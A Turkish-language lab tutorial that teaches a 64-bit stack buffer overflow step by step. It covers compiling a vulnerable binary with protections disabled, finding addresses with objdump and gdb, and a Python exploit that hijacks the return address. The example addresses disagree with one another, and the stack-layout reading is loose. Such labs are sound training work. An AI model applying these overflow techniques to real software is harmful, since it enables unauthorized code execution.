# CyberLabs: Stack Buffer Overflow ile Akış Kontrolü Laboratuvarı

**Modül Kodu:** CL-MEM-002

**Seviye:** Orta / İleri

**Konu:** Bellek Bozulması Zafiyetleri (Memory Corruption)

## Laboratuvarın Amacı

Bu laboratuvar, CyberLabs eğitim platformu için hazırlanmış olup, klasik **Stack Buffer Overflow (Yığın Tampon Taşması)** zafiyetini ve bu zafiyetin program akışını ele geçirmek için nasıl kullanılabileceğini detaylı bir şekilde ele almaktadır. Katılımcıların bu laboratuvar sonunda aşağıdaki yetkinlikleri kazanması hedeflenmektedir:

  * Stack Buffer Overflow zafiyetinin programın geri dönüş adresini (return address) nasıl etkilediğini anlamak.
  * `g++` derleyicisi ile exploit geliştirmeyi kolaylaştıran bayrakları (`-fno-stack-protector`, `-z execstack`, `-no-pie`) kullanarak program derlemek.
  * `objdump` ile bir program üzerinde statik analiz yaparak fonksiyon adreslerini tespit etmek.
  * `gdb` (GNU Debugger) ile dinamik analiz yapmak, programı çökertmek ve yığın (stack) durumunu analiz etmek.
  * GDB içerisinde `x/32gx $rbp` gibi komutlar kullanarak yığın üzerindeki veriyi doğrudan incelemek ve sömürü için gereken ofset (offset) değerini doğrulamak.

## Disclaimer / Yasal Uyarı

The information provided in this blog post is intended for educational and informational purposes only. It is not intended to encourage or promote any illegal or unethical activities, including hacking, cyberattacks, or any form of unauthorized access to computer systems, networks, or data.

Bu blog yazısında sağlanan bilgiler yalnızca eğitim ve bilgilendirme amaçlıdır. Bilgisayar korsanlığı, siber saldırılar veya bilgisayar sistemlerine, ağlara veya verilere herhangi bir şekilde yetkisiz erişim de dahil olmak üzere herhangi bir yasa dışı veya etik olmayan faaliyeti teşvik etme veya reklamlama amacı taşımaz.

Bu laboratuvar içeriği, tamamen **CyberLabs eğitim ortamı** için tasarlanmıştır. Buradaki bilgi ve kodların amacı, siber güvenlik uzmanlarının savunma mekanizmalarını daha iyi anlamalarına ve zafiyet analizi yeteneklerini geliştirmelerine yardımcı olmaktır. Bu materyallerin CyberLabs ortamı dışında veya yasa dışı amaçlarla kullanılması kesinlikle yasaktır ve tüm sorumluluk kullanıcıya aittir.

## Zorluk Seviyeleri

## 🟢 **KOLAY YOL: Debug Sembolleri ile**
```bash
# test_lab.sh dosyasında -g flag'ini ekleyin
g++ -m64 -fno-stack-protector -z execstack -no-pie -g -o vulnerable_code vulnerable_code.cpp
```
- Debug sembolleri ile daha kolay analiz
- GDB'de `p &variable` komutları çalışır
- Eğitim amaçlı ideal

## 🔴 **ZOR YOL: Debug Sembolleri Olmadan (Varsayılan)**
```bash
# Mevcut derleme (debug sembolleri yok)
g++ -m64 -fno-stack-protector -z execstack -no-pie -o vulnerable_code vulnerable_code.cpp
```
- Gerçek dünyaya daha yakın
- `info functions`, `disassemble` komutları gerekir
- Production binary'lerde debug sembolleri yoktur

## Kurulum ve Çalıştırma Adımları

### 1\. Zafiyetli Kodu Derleme

İlk adım, C++ kaynak kodunu belirli bayraklar kullanarak derlemektir. Bu bayraklar, modern işletim sistemlerindeki bazı koruma mekanizmalarını devre dışı bırakarak zafiyeti sömürmeyi daha öngörülebilir hale getirir.

```bash
g++ -m64 -fno-stack-protector -z execstack -no-pie -o vulnerable_code vulnerable_code.cpp
```

  * `-m64`: Programı 64-bit olarak derler.
  * `-fno-stack-protector`: Yığın taşmalarını tespit etmek için kullanılan "canary" değerlerini devre dışı bırakır.
  * `-z execstack`: Yığın (stack) bölgesini çalıştırılabilir (executable) olarak işaretler. Bu, yığına shellcode enjekte edip çalıştırma senaryoları için gereklidir.
  * `-no-pie`: Konumdan Bağımsız Yürütülebilir (PIE) özelliğini kapatır. Bu sayede program ve fonksiyon adresleri her çalıştırmada sabit kalır.

### 2\. Statik Analiz: Hedef Fonksiyon Adresini Bulma

<img width="733" height="75" alt="resim" src="https://github.com/user-attachments/assets/c407363a-8b4b-48b5-a5f0-d73113a554de" />

Amacımız, programın akışını normalde çağrılmayacak bir fonksiyona (örneğin `hedef_fonksiyon`) yönlendirmektir. Bunun için `objdump` aracı ile bu fonksiyonun bellekteki adresini bulmamız gerekir.

```bash
objdump -d ./vulnerable_code | grep hedef_fonksiyon
```

Bu komutun çıktısı size `hedef_fonksiyon`'un başlangıç adresini verecektir. Örneğin:
`0000000000401186 <hedef_fonksiyon>:`
Bu durumda hedef adresimiz `0x401186` olacaktır.

### 3\. Dinamik Analiz: Zafiyeti GDB ile Tetikleme

<img width="1111" height="491" alt="resim" src="https://github.com/user-attachments/assets/6e376db3-7dba-47ae-90a8-b11294642aff" />

Şimdi zafiyetin varlığını ve etkisini GDB (GNU Debugger) ile canlı olarak inceleyeceğiz.

```bash
gdb vulnerable_code
```

GDB ortamı açıldıktan sonra, programı arabelleği taşıracak özel bir girdi ile çalıştırın. `A` karakteri (HEX `0x41`), bellekte kolayca tanınabildiği için dolgu (padding) amacıyla sıkça kullanılır. 72 byte'lık bir 'A' dizisi gönderelim.

```
(gdb) run <<< $(python -c 'print("A"*72)')
```

Program, geri dönüş adresinin `0x4141414141414141` gibi geçersiz bir adresle üzerine yazıldığı için "Segmentation fault" hatası vererek çökecektir. Bu, kontrolü ele geçirmeye çok yakın olduğumuzu gösterir.

### 4\. Yığını İnceleme: `x/32gx $rbp`

<img width="1106" height="705" alt="resim" src="https://github.com/user-attachments/assets/94d10fb4-10b5-4e33-be4a-5eb55f6ccafd" />


Çökme anında yığının (stack) durumunu görmek, sömürü kodunu yazmak için en kritik adımdır. `x/32gx $rbp` komutu, çökme anında yığın işaretçisinin (`$rbp`) gösterdiği yerden başlayarak belleği incelememizi sağlar.

  * `x`: e**x**amine (incele) komutu.
  * `/32gx`: 32 adet **g**iant word (64-bit) veriyi he**x** formatında göster.

<!-- end list -->

```
(gdb) x/32gx $rbp
```

Bu komutun çıktısı şuna benzer olacaktır:

```
0x7fffffffe318: 0x4141414141414141      0x00007ffff7a2d830
0x7fffffffe328: 0x00000000004011e9      0x0000000100000000
...
```

**Bu çıktıyı nasıl yorumlarız?**

  * `0x7fffffffe318:`: Yığındaki bellek adresi.
  * `0x4141414141414141`: Burası, tam olarak geri dönüş adresinin bulunması gereken yerdir. 72 byte'lık 'A' girdimizin son 8 byte'ı buraya denk gelmiştir. Bu, geri dönüş adresini kontrol etmek için **72 byte'lık bir dolguya (padding) ihtiyacımız olduğunu** doğrular.

### 5\. Exploit'i Geliştirme ve Çalıştırma

<img width="681" height="290" alt="resim" src="https://github.com/user-attachments/assets/446ab1a1-d524-4318-8f45-44d057ae05bf" />

Artık tüm bilgilere sahibiz:

1.  **Gereken Dolgu Boyutu:** 72 byte.
2.  **Hedef Adres:** `objdump` ile bulduğumuz adres (ör: `0x401186`).

Bu bilgileri kullanarak exploit'imizi yazabiliriz. Payload'ımız `[ 72 byte 'A' ] + [ 8 byte Hedef Adres ]` şeklinde olacaktır.

```python
# exploit_final.py
import struct
import subprocess
import sys

# Zafiyetli programın derlenmiş adı
VICTIM_PROGRAM = "./vulnerable_code"

# --- GDB ILE BU ADRESI KENDI SISTEMINIZDE BULUN ---
# Örneğin: 0x4011e9
HEDEF_ADRES = 0x401146  # <-- BU SATIRI GDB'DEN ALDIĞINIZ ADRES ILE GÜNCELLEYİN

# 64-bit mimari için hesaplanan padding boyutu
# [64 byte buffer] + [8 byte kaydedilmiş RBP] = 72 byte
PADDING_SIZE = 72

def main():
    """
    Sömürü işlemini başlatan ana fonksiyon.
    """
    print("--- [SALDIRGAN] Stack Overflow Exploit Baslatildi ---")
    
    if HEDEF_ADRES == 0x4011e9:
        print("\n[!] UYARI: HEDEF_ADRES'i kendi sisteminizdeki adresle güncellemeyi unutmayın!\n")

    print(f"[*] Hedef Adres: {hex(HEDEF_ADRES)}")
    print(f"[*] Padding Boyutu: {PADDING_SIZE}")
    
    # Payload'ı oluştur: [ 72 byte dolgu ('A') ] + [ 8 byte hedef adres ]
    padding = b'A' * PADDING_SIZE
    
    # Adresi 64-bit (8 byte) ve little-endian formatında paketle
    overwrite_address = struct.pack("<Q", HEDEF_ADRES)
    
    payload = padding + overwrite_address
    
    print(f"[*] Payload {len(payload)} byte olarak olusturuldu.")
    
    try:
        # Zafiyetli programı bir alt süreç olarak başlatıyoruz.
        # stdin'e yazma, stdout/stderr'den okuma yapmak için pipe'ları bağlıyoruz.
        p = subprocess.Popen(
            [VICTIM_PROGRAM], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
    except FileNotFoundError:
        print(f"\n[!] HATA: '{VICTIM_PROGRAM}' bulunamadi. C++ kodunu derlediniz mi?")
        sys.exit(1)
        
    print("[*] Payload kurban programa gonderiliyor...")
    
    # Payload'ı programın standart girdisine gönder ve çıktıyı al
    stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    # Çıktıyı daha rahat işlemek için byte'tan string'e dönüştür
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    
    print("\n--- Kurban Programdan Gelen Cikti ---")
    print(stdout_output)
    print("------------------------------------")
    
    # Programın çıktısında belirlediğimiz anahtar kelimeyi arıyoruz.
    if "KONTROL ELE GECIRILDI" in stdout_output:
        print("\n[+] Zafiyet basariyla istismar edildi!")
    else:
        print("\n[-] Istismar basarisiz oldu. Adresi veya ofseti kontrol edin.")
        # Hata ayıklama için stderr'i de yazdırabiliriz
        stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')
        if stderr_output:
            print("\n--- Hata Ciktisi (stderr) ---")
            print(stderr_output)


if __name__ == "__main__":
    main()

```

Exploit'i çalıştırdığınızda, programın çıktısında `hedef_fonksiyon` içinde tanımlanmış olan başarı mesajını görmelisiniz. Bu, programın akışını başarıyla ele geçirdiğiniz anlamına gelir.
